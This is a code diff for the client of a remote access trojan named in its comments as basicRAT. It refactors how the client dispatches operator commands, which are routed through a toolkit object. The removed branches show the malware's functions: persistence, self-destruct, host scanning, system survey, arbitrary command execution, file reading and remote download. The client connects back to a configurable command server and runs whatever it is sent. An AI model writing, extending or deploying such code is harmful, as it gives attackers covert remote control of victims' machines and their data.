@@ -13,7 +13,7 @@ from core import *
 
 
 # change these to suit your needs
-HOST = '192.168.0.174'
+HOST = 'localhost'
 PORT = 1337
 
 # seconds to wait before client will attempt to reconnect
@@ -31,7 +31,8 @@ else:
     sys.exit(1)
 
 
-def client_loop(conn, dhkey):
+def client_loop(conn, command_executor, dhkey):
+    
     while True:
         results = ''
 
@@ -41,50 +42,15 @@ def client_loop(conn, dhkey):
         # seperate data into command and action
         cmd, _, action = data.partition(' ')
 
+
+        results = getattr(command_executor, cmd)(action)
+        results = results.rstrip() + '\n{} completed.'.format(cmd)
+
         if cmd == 'kill':
-            conn.close()
             return 1
 
-        elif cmd == 'selfdestruct':
-            conn.close()
-            toolkit.selfdestruct(PLAT)
-
-        elif cmd == 'quit':
-            conn.shutdown(socket.SHUT_RDWR)
-            conn.close()
-            break
-
-        elif cmd == 'persistence':
-            results = persistence.run(PLAT)
-
-        elif cmd == 'scan':
-            results = scan.single_host(action)
-
-        elif cmd == 'survey':
-            results = survey.run(PLAT)
-
-        elif cmd == 'cat':
-            results = toolkit.cat(action)
-
-        elif cmd == 'execute':
-            results = toolkit.execute(action)
-
-        elif cmd == 'ls':
-            results = toolkit.ls(action)
-
-        elif cmd == 'pwd':
-            results = toolkit.pwd()
-
-        elif cmd == 'unzip':
-            results = toolkit.unzip(action)
-
-        elif cmd == 'wget':
-            results = toolkit.wget(action)
-
-        elif cmd == 'alert':
-            results = toolkit.alert(action)
-
-        results = results.rstrip() + '\n{} completed.'.format(cmd)
+        if cmd == 'quit':
+            return 0
 
         conn.send(crypto.encrypt(results, dhkey))
 
@@ -94,6 +60,7 @@ def main():
 
     while True:
         conn = socket.socket()
+        command_executor = toolkit.Toolkit(PLAT, conn)
 
         try:
             # attempt to connect to basicRAT server
@@ -108,7 +75,7 @@ def main():
         # horrible for debugging. It will keep the client alive if the server
         # is torn down unexpectedly, or if the client freaks out.
         try:
-            exit_status = client_loop(conn, dhkey)
+            exit_status = client_loop(conn, command_executor, dhkey)
         except: pass
 
         if exit_status:
